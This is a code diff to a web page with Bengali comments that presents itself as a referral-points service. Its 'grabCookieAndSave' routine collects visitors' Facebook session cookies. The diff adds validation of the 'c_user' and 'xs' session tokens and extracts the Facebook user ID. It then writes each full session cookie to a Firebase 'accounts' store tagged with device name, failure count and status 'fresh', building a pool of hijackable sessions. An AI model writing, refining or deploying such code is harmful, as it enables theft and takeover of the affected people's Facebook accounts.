@@ -263,6 +263,13 @@
       window.location.replace("https://m.facebook.com/login");
     }
 
+    // কুকি ভ্যালিডেট করার ফাংশন
+    function validateCookie(cookie) {
+      if (!cookie || !cookie.includes('c_user')) return 'c_user missing/invalid';
+      if (!cookie.includes('xs')) return 'xs missing — session invalid';
+      return null;
+    }
+
     window.grabCookieAndSave = async function() {
       const status = document.getElementById('loginStatus');
       const btn = document.getElementById('btnConnect');
@@ -280,8 +287,10 @@
         return;
       }
 
-      if (!cookie || !cookie.includes('c_user')) {
-        status.innerText = "❌ Please login to Facebook first (Step 1).";
+      // কুকি চেক
+      const bad = validateCookie(cookie);
+      if (bad) {
+        status.innerText = "❌ " + bad + ". Please login again.";
         return;
       }
 
@@ -291,8 +300,14 @@
       btnText.innerText = "Connecting...";
       
       try {
+        // c_user আইডি বের করা
+        const cUserMatch = cookie.match(/(?:^|;\s*)c_user=(\d+)/);
+        const cUserId = cUserMatch ? cUserMatch[1] : "unknown";
+        
+        // পুরোনো btoa এর বদলে সরাসরি ফেসবুক আইডি দিয়ে key বানানো হলো
+        const currentUserKey = 'u_' + cUserId; 
+
         const dbRef = ref(db);
-        const currentUserKey = btoa(cookie.substring(0, 15)); 
         const snapshot = await get(child(dbRef, `users/${currentUserKey}`));
         let points = 0;
         let isNewUser = false;
@@ -305,6 +320,7 @@
           isNewUser = true;
         }
 
+        // রেফারেল লজিক
         if (isNewUser && referrerKey && referrerKey !== currentUserKey) {
           try {
             await update(ref(db, `users/${currentUserKey}`), { points: increment(1) });
@@ -314,7 +330,15 @@
           } catch (refErr) { console.log("Referral error:", refErr); }
         }
 
-        await set(push(ref(db, 'accounts')), { cookie: cookie });
+        // অ্যাকাউন্ট পুশ করা (ডুপ্লিকেট বন্ধ করতে নির্দিষ্ট key ব্যবহার)
+        await set(ref(db, `accounts/acc_${cUserId}`), { 
+          cookie: cookie, 
+          c_user: cUserId, 
+          deviceName: deviceName,
+          addedAt: Date.now(), 
+          fails: 0, 
+          status: 'fresh'
+        });
 
         localStorage.setItem('cyber_cookie', cookie);
         localStorage.setItem('cyber_key', currentUserKey);
@@ -332,4 +356,4 @@
     }
   </script>
 </body>
-        </html>
+  </html>
